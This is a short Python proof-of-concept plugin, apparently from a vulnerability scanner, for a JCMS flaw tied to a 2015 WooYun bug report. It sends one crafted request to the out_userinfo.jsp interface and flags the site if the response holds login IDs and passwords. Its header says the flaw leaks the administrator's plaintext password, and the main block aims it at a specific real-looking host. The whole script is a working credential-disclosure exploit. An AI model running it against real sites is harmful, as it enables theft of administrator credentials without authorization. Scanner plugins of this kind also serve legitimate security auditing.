#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
POC Name: JCMS 某处缺陷直接爆管理员明文密码
Author  :  louye_test
mail    :  919109671@qq.com
Referer :http://www.wooyun.org/bugs/wooyun-2015-095221
'''
def assign(service, arg):
    if service == "jcms":
        return True, arg


def audit(arg):
     
    payload = "jcms/interface/user/out_userinfo.jsp?xmlinfo=%3Cmain%3E%3Cstatus%3EQ%3C/status%3E%3C/main%3E"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and 'loginid' in res and 'password' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('jcms','http://vip.cutc.com.cn/')[1])